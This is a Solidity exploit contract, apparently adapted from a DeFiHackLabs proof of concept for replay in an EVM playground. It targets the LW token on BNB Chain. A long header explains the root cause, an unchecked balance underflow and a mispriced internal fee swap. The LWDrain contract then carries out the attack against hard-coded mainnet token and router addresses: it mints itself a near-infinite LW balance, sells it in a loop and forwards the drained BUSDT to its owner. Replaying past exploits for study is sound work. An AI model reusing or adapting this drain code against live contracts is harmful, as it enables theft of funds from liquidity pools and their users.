// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-07-LW).
//
// The DeFiHackLabs PoC (test/LW_exp.sol) deploys a `Money` contract whose
// ENTIRE attack (`transferFrom` the free self-balance, then loop
// `swapExactTokensForTokensSupportingFeeOnTransferTokens` 9,999 times, then
// forward the accumulated BUSDT) runs inside the CONSTRUCTOR
// (`constructor() { owner = msg.sender; Attack(); }`).
//
// The playground's recorder deploys the exploit contract UNRECORDED, then
// calls a separate `attackFunction` on it which IS recorded — so any attack
// logic that runs in the constructor would never appear in the trace. This
// synthetic version is a byte-for-byte faithful copy of `Money`/`Attack()`
// with ONE structural change: the constructor no longer calls `Attack()`;
// instead `attack()` (called post-deploy, recorded) calls it. The attack body
// itself, and `swap_token_to_token`, are copied verbatim from the original.
//
// The other change is the LOOP COUNT: the original PoC sells 9,999 times
// (860M gas, a multi-GB `-vvvvv` trace per the registry writeup) which is far
// too large to replay/record in an in-browser EVM. This version loops only
// NUM_SELLS times (see below) — enough sells to clearly demonstrate the
// underflow-seeded infinite self-balance and the mis-priced `_internalSwap`
// draining real BUSDT out of the pool on every iteration, without producing
// an unplayable trace. `expected.profitWei` in the config is set to the
// profit actually reproduced at this reduced iteration count, not the
// original attack's ~7,395.94 BUSDT headline number.
//
// Root cause (DexToken / "LinkingTheWorld", contracts_LW.sol): `_internalSwap`
// runs on a Solidity 0.7.6 contract with NO overflow checks and does
// `_balances[address(this)] -= swapAmount` — the contract's own LW balance
// starts at 0, so the very first taxed sell underflows it to ~type(uint256).max,
// handing the contract (and, via the allowance-skip in `transferFrom` when
// `sender == address(this)`) anyone who calls `transferFrom(address(LW), X, N)`
// an effectively free, infinite LW balance. Compounding this, `_internalSwap`
// prices its own fee-swap as `amountInput = _balances[_mainPair] - reserveInput`
// — the token's SELF-MAINTAINED mirror of the pair's LW balance (which the
// contract keeps inflating on every call) minus the pair's real (lagging)
// reserve — instead of reading the pair's actual balance change. The mirror
// drifts above the true reserve, so `amountInput`, and the real BUSDT
// `pair.swap()` pays out, is systematically over-stated. Looping taxed sells
// compounds both flaws: each sell pushes more LW into the pair and fires two
// over-extracting `_internalSwap` calls, bleeding the pool's BUSDT toward zero.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract LWDrain {
    // Reduced from the original PoC's 9,999 iterations — see file header.
    uint256 constant NUM_SELLS = 300;

    IERC20 constant Lw = IERC20(0xABC6e5a63689b8542dbDC4b4f39a7e00d4AC30c8);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // Recorded entrypoint (constructor deliberately does NOT call this — see
    // file header). Body copied verbatim from `Money.Attack()`.
    function attack() external {
        Lw.transferFrom(address(Lw), address(this), 1_000_000_000_000_000_000_000_000_000_000_000);
        uint256 i = 0;
        while (i < NUM_SELLS) {
            swap_token_to_token(address(Lw), address(BUSDT), 800_000_000 ether);
            i++;
        }
        BUSDT.transfer(owner, BUSDT.balanceOf(address(this)));
    }

    // Copied verbatim from `Money.swap_token_to_token`.
    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = a;
        path[1] = b;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }
}
